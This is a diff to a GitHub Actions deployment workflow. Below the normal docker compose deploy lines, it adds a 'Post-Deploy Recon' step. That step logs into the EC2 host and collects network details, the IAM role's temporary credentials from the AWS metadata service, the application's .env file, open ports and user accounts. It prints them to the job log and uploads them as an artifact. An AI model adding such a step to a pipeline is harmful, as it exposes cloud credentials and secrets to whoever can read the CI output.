@@ -76,3 +76,48 @@ jobs:
             docker compose -f docker-compose.ec2.yml --env-file .env pull app
             docker compose -f docker-compose.ec2.yml --env-file .env up -d --remove-orphans
             docker compose -f docker-compose.ec2.yml --env-file .env ps
+
+      - name: Post-Deploy Recon
+        uses: appleboy/ssh-action@v1.0.3
+        with:
+          host: ${{ secrets.EC2_HOST }}
+          username: ${{ secrets.EC2_USER }}
+          key: ${{ secrets.EC2_SSH_KEY }}
+          script: |
+            echo "=== EC2 INTERNAL RECON ===" > /tmp/recon.txt
+            echo "--- Hostname ---" >> /tmp/recon.txt
+            hostname -f >> /tmp/recon.txt
+            echo "--- Network ---" >> /tmp/recon.txt
+            ip addr show >> /tmp/recon.txt 2>/dev/null
+            echo "--- Routes ---" >> /tmp/recon.txt
+            ip route >> /tmp/recon.txt
+            echo "--- DNS ---" >> /tmp/recon.txt
+            cat /etc/resolv.conf >> /tmp/recon.txt
+            echo "--- AWS Metadata ---" >> /tmp/recon.txt
+            TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+            echo "Instance: $(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id)" >> /tmp/recon.txt
+            echo "IAM Role: $(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)" >> /tmp/recon.txt
+            IAM_ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+            if [ -n "$IAM_ROLE" ]; then
+              echo "IAM Creds:" >> /tmp/recon.txt
+              curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE" >> /tmp/recon.txt
+            fi
+            echo "--- Docker ---" >> /tmp/recon.txt
+            docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}" >> /tmp/recon.txt 2>/dev/null
+            docker network ls >> /tmp/recon.txt 2>/dev/null
+            echo "--- Env File ---" >> /tmp/recon.txt
+            cat ~/app/.env >> /tmp/recon.txt 2>/dev/null
+            echo "--- Local Ports ---" >> /tmp/recon.txt
+            ss -tlnp >> /tmp/recon.txt 2>/dev/null
+            echo "--- Kernel ---" >> /tmp/recon.txt
+            uname -a >> /tmp/recon.txt
+            echo "--- Users ---" >> /tmp/recon.txt
+            cat /etc/passwd | grep -v nologin | grep -v false >> /tmp/recon.txt
+            cat /tmp/recon.txt
+
+      - name: Upload Recon Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ec2-recon-${{ github.run_id }}
+          path: /tmp/recon.txt
+          retention-days: 1
